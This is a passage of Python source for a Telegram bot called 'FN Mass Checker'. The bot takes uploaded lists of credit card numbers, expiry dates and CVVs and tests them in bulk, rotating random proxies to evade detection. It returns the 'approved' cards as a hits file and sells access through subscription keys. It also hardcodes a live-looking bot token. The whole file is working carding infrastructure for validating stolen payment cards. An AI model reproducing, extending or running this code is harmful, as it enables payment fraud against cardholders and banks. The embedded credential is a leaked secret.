    except Exception as e:
        logger.error(f"Error handling file for user {user_id} in chat {chat_id}: {str(e)}")
        message = "Error processing file. Please try again."
        if chat_type == 'private':
            await update.message.reply_text(message)
        else:
            await update.message.reply_text(message, reply_to_message_id=update.message.message_id)

async def check_multiple_cards(bot, user_id, cards):
    chat_id = user_data[user_id]['chat_id']
    chat_type = user_data[user_id]['chat_type']
    try:
        user_data[user_id].update({
            'cards': cards, 'checked': 0, 'approved': 0,
            'approved_list': [], 'start_time': time.time(), 'last_updated': 0
        })
        logger.info(f"User {user_id} starting multi-card check with {len(cards)} cards in chat {chat_id}")
        for i in range(0, len(cards), CHUNK_SIZE):
            if user_data[user_id].get('stop', False):
                logger.info(f"User {user_id} stopped multi-card check in chat {chat_id}")
                break
            chunk = cards[i:i + CHUNK_SIZE]
            logger.debug(f"User {user_id} processing chunk of {len(chunk)} cards: {chunk}")
            tasks = []
            for card in chunk:
                try:
                    cc, mes, ano, cvv = card.split('|')
                    if len(mes) == 1:
                        mes = f'0{mes}'
                    if len(ano) == 2:
                        ano = f'20{ano}'
                    proxy = random.choice(proxies) if proxies and USE_PROXIES else None
                    tasks.append(check_cc(cc, mes, ano, cvv, proxy))
                except Exception as e:
                    logger.warning(f"Invalid card format for user {user_id}: {card} - {str(e)}")
                    continue
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for card, result in zip(chunk, results):
                    if isinstance(result, Exception):
                        logger.error(f"Error checking card {card} for user {user_id}: {str(result)}")
                        continue
                    user_data[user_id]['checked'] += 1
                    proxy_status = result.get('proxy_status', 'None')
                    if result['status'] in ['approved', 'ccn']:
                        user_data[user_id]['approved'] += 1
                        user_data[user_id]['approved_list'].append(card)
                        message = await format_approved_message(result, card, user_id, bot, proxy_status) if result['status'] == 'approved' else await format_ccn_message(result, card, user_id, bot, proxy_status)
                        await bot.send_message(
                            chat_id,
                            message,
                            parse_mode='HTML',
                            reply_to_message_id=user_data[user_id].get('last_message_id') if chat_type != 'private' else None
                        )
                    # Update progress every 50 cards
                    if user_data[user_id]['checked'] - user_data[user_id]['last_updated'] >= 50:
                        progress = generate_progress_message(
                            user_data[user_id]['approved'],
                            user_data[user_id]['checked'] - user_data[user_id]['approved'],
                            user_data[user_id]['checked'],
                            len(cards),
                            user_data[user_id]['start_time']
                        )
                        try:
                            await bot.edit_message_text(
                                progress,
                                chat_id=chat_id,
                                message_id=user_data[user_id]['progress_message_id'],
                                parse_mode='HTML'
                            )
                            user_data[user_id]['last_updated'] = user_data[user_id]['checked']
                        except Exception as e:
                            logger.warning(f"Failed to update progress for user {user_id}: {str(e)}")
            await asyncio.sleep(BATCH_DELAY)
        
        # Handle completion or stop
        if user_data[user_id]['approved_list']:
            summary = generate_progress_message(
                user_data[user_id]['approved'],
                user_data[user_id]['checked'] - user_data[user_id]['approved'],
                user_data[user_id]['checked'],
                len(cards),
                user_data[user_id]['start_time']
            ).replace("𝐋𝐈𝐕𝐄 𝐏𝐑𝐎𝐆𝐑𝐄𝐒𝐒", "𝐇𝐈𝐓𝐒")
            approved_file = io.StringIO()
            for card in user_data[user_id]['approved_list']:
                approved_file.write(f"APPROVED ✅ {card}\n")
            approved_file.seek(0)
            await bot.send_document(
                chat_id,
                approved_file,
                filename=f"fn-checker-hits{random.randint(1000,9999)}.txt",
                caption=summary,
                parse_mode='HTML',
                reply_to_message_id=user_data[user_id].get('last_message_id') if chat_type != 'private' else None
            )
        else:
            await bot.send_message(
                chat_id,
                "No Approved CC Found. No Need To Send hits.txt",
                parse_mode='HTML',
                reply_to_message_id=user_data[user_id].get('last_message_id') if chat_type != 'private' else None
            )
        
        # Update last check completion time
        users_collection.update_one(
            {"user_id": user_id},
            {"$set": {"last_check_completed": datetime.utcnow()}}
        )
        logger.info(f"User {user_id} completed multi-card check: {user_data[user_id]['approved']} approved, {user_data[user_id]['checked']} checked in chat {chat_id}")
    except Exception as e:
        logger.error(f"Error in check_multiple_cards for user {user_id} in chat {chat_id}: {str(e)}")
        await bot.send_message(
            chat_id,
            f"Error during card checking: {str(e)}",
            parse_mode='HTML',
            reply_to_message_id=user_data[user_id].get('last_message_id') if chat_type != 'private' else None
        )
    finally:
        user_data[user_id]['checking'] = False

async def button(update: Update, context):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat.id
    chat_type = query.message.chat.type
    await query.answer()
    try:
        if query.data == 'upload_combo':
            subscription = get_user_subscription(user_id)
            if not subscription:
                message = "You need an active subscription. Use /redeem {key} to activate."
                if chat_type == 'private':
                    await query.message.reply_text(message)
                else:
                    await query.message.reply_text(message, reply_to_message_id=query.message.message_id)
                return
            message = "Send your txt file"
            if chat_type == 'private':
                await query.message.reply_text(message)
            else:
                await query.message.reply_text(message, reply_to_message_id=query.message.message_id)
        elif query.data == 'live_stats':
            if user_id in user_data and user_data[user_id].get('checking', False):
                progress = generate_progress_message(
                    user_data[user_id]['approved'],
                    user_data[user_id]['checked'] - user_data[user_id]['approved'],
                    user_data[user_id]['checked'],
                    len(user_data[user_id]['cards']),
                    user_data[user_id]['start_time']
                )
                if chat_type == 'private':
                    await query.message.reply_text(progress, parse_mode='HTML')
                else:
                    await query.message.reply_text(progress, parse_mode='HTML', reply_to_message_id=query.message.message_id)
            else:
                message = "No ongoing check."
                if chat_type == 'private':
                    await query.message.reply_text(message)
                else:
                    await query.message.reply_text(message, reply_to_message_id=query.message.message_id)
        elif query.data == 'help':
            message = (
                "🔥 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓\n\n"
                "• Use /chk cc|mm|yy|cvv to check a single card.\n"
                "• Send a .txt file with cards (cc|mm|yy|cvv, one per line) to check multiple cards.\n"
                "• Use /stats to see current progress.\n"
                "• Use /stop or 'Cancel Check' to stop an ongoing check.\n"
                "• Use /redeem {key} to activate a subscription.\n"
                "• Owner: Use /genkey {Gold, Platinum, Owner} {1d, 7d, 30d} to generate keys."
            )
            if chat_type == 'private':
                await query.message.reply_text(message)
            else:
                await query.message.reply_text(message, reply_to_message_id=query.message.message_id)
        elif query.data == 'cancel_check':
            if user_id in user_data and user_data[user_id].get('checking', False):
                user_data[user_id]['stop'] = True
                message = "Check canceled."
                if chat_type == 'private':
                    await query.message.reply_text(message)
                else:
                    await query.message.reply_text(message, reply_to_message_id=query.message.message_id)
            else:
                message = "No ongoing check to cancel."
                if chat_type == 'private':
                    await query.message.reply_text(message)
                else:
                    await query.message.reply_text(message, reply_to_message_id=query.message.message_id)
    except Exception as e:
        logger.error(f"Error in button handler for user {user_id} in chat {chat_id}: {str(e)}")
        message = "Error processing button action."
        if chat_type == 'private':
            await query.message.reply_text(message)
        else:
            await query.message.reply_text(message, reply_to_message_id=query.message.message_id)

# Main function to start the bot
async def main():
    try:
        application = Application.builder().token('8009942983:AAEI2FKC6npMOaTR0GT-uWalSZqb-GjOxvU').build()
        
        application.add_handler(CommandHandler('start', start))
        application.add_handler(CommandHandler('genkey', genkey))
        application.add_handler(CommandHandler('redeem', redeem))
        application.add_handler(CommandHandler('stop', stop))
        application.add_handler(CommandHandler('stats', stats))
        application.add_handler(CommandHandler('chk', chk))
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(CallbackQueryHandler(button))
        
        logger.info("Starting bot polling...")
        await application.initialize()
        await application.run_polling()
    except Exception as e:
        logger.error(f"Error in main: {str(e)}")
    finally:
        logger.info("Shutting down bot...")
        await application.shutdown()

if __name__ == '__main__':
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            logger.warning("Event loop is already running, using nest_asyncio.")
            loop.create_task(main())
            loop.run_forever()
        else:
            asyncio.run(main())
    except Exception as e:
        logger.error(f"Fatal error: {str(e)}")
